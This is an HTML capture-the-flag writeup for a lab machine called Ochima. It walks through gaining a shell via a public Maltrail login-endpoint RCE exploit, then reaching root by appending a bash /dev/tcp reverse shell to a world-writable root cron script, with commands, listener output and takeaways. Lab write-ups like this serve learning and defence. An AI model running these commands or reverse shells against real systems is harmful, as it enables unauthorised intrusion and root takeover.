@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ochima &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Ochima</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Maltrail</span><span class="tag">RCE</span><span class="tag">CVE</span><span class="tag">CronJob</span><span class="tag">WritableScript</span><span class="tag">BashTCP</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#version-identification">Version Identification</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#maltrail-unauthenticated-rce">Maltrail Unauthenticated RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#world-writable-cron-script">World-Writable Cron Script</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Ochima is a straightforward Linux box built around a known unauthenticated RCE vulnerability in Maltrail v0.53, served on port 8338. Once inside as <code>snort</code>, a world-writable cron script owned by root provides an immediate and clean path to a root shell via bash TCP redirect.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code>22/tcp   open  ssh
+80/tcp   open  http
+8338/tcp open  unknown
+</code></pre>
+<p>Port 8338 stood out as non-standard. Browsing to it reveals a Maltrail login page.</p>
+<h3 id="version-identification">Version Identification</h3>
+<p>The landing page exposes the application version:</p>
+<pre><code>Maltrail (v0.52)
+</code></pre>
+<p>The login gate prevents further browsing, but the version string is enough. Searching for Maltrail exploits turns up a public pre-auth RCE targeting v0.53:</p>
+<p><strong>Maltrail-v0.53-Exploit</strong>
+https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py</p>
+<blockquote>
+<p><strong>Why the version mismatch doesn't matter:</strong> The v0.53 exploit targets a command injection in the login endpoint that was present in earlier releases. The application advertises v0.52, but the vulnerable code path existed before the patch was applied, so the exploit still lands.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="maltrail-unauthenticated-rce">Maltrail Unauthenticated RCE</h3>
+<p>The exploit takes an attacker IP, listener port, and target URL, then injects a payload into the login endpoint:</p>
+<pre><code class="language-sh">python3 exploit.py 192.168.45.244 80 http://192.168.180.32:8338/
+Running exploit on http://192.168.180.32:8338//login
+</code></pre>
+<p>Listener catches the shell as <code>snort</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.32] 43628
+$ whoami
+snort
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+snort@ochima:/opt/maltrail-0.53$
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="world-writable-cron-script">World-Writable Cron Script</h3>
+<p>LinPEAS flags a backup script in <code>/var/backups</code> and notes root activity:</p>
+<pre><code class="language-sh">snort@ochima:/var/backups$ cat etc_Backup.sh
+#! /bin/bash
+tar -cf /home/snort/etc_backup.tar /etc
+</code></pre>
+<p>Permissions:</p>
+<pre><code class="language-sh">-rwxrwxrwx  1 root root   54 Dec 11  2023 etc_Backup.sh
+</code></pre>
+<blockquote>
+<p><strong>Why this is immediately game over:</strong> The file is owned by root and executed by root on a cron schedule, but every user on the system can write to it. There's no need to race conditions or bypass anything. Append a reverse shell, wait for the cron trigger, receive root.</p>
+</blockquote>
+<p>LinPEAS identified this as a cron file and confirmed root had logged in recently, which is a reliable indicator the job is active.</p>
+<p>Appending a bash reverse shell:</p>
+<pre><code class="language-sh">echo 'bash -i &gt;&amp; /dev/tcp/192.168.45.167/8338 0&gt;&amp;1' &gt;&gt; etc_Backup.sh
+</code></pre>
+<p>Confirming the append:</p>
+<pre><code class="language-sh">snort@ochima:/var/backups$ cat etc_Backup.sh
+#! /bin/bash
+tar -cf /home/snort/etc_backup.tar /etc
+bash -i &gt;&amp; /dev/tcp/192.168.45.167/8338 0&gt;&amp;1
+</code></pre>
+<h2 id="root">Root</h2>
+<p>After waiting for the cron to fire, the root shell arrives:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 8338
+listening on [any] 8338 ...
+connect to [192.168.45.167] from (UNKNOWN) [192.168.204.32] 48212
+root@ochima:~# whoami
+root
+</code></pre>
+<pre><code class="language-sh">root@ochima:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Version strings in login pages are free intelligence.</strong> Maltrail advertised its version before authentication was required, cutting recon time to seconds.</li>
+<li><strong>World-writable files owned by root are instant privesc.</strong> The <code>rwxrwxrwx</code> on a root-executed cron script is worse than a SUID binary, it requires no exploit, just a text append.</li>
+<li><strong>LinPEAS + cron file detection:</strong> LinPEAS flagging a file as cron-related and showing recent root login together is a strong signal the job is actively firing. <code>pspy</code> would confirm it, but isn't always necessary.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
